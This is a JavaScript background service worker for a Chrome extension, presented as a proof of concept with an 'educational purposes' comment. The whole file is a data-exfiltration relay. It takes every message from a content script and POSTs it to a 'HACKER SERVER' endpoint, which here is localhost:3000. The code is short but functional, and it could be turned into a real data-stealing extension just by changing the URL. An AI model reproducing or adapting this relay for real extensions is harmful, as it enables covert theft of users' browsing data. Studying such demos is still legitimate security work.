const sw_name = "The best PoC SERVICE WORKER made by Shannah (no chat j'ai pété)";

console.log(`${sw_name}: Background script running.`);

// Example of logging actions for educational purposes
chrome.runtime.onInstalled.addListener(() => {
    console.log(`${sw_name} installed.`);

    // Receive the message from the CONTENT script
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        console.log("Received message from CONTENT script:", message);
        sendResponse({ response: `Message sent to HACKER SERVER:`, message });

        // Send the message to localhost:3000 (HACKER SERVER)
        fetch('http://localhost:3000/message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        })
            .then(response => response.json())
            .then(data => {
                console.log(`Message SUCCESSFULLY sent to HACKER SERVER. HACKER SERVER's response ${JSON.stringify(data, null, 2)}`);
            })
            .catch(error => console.error('Error sending message to localhost:3000:', error));
    });
});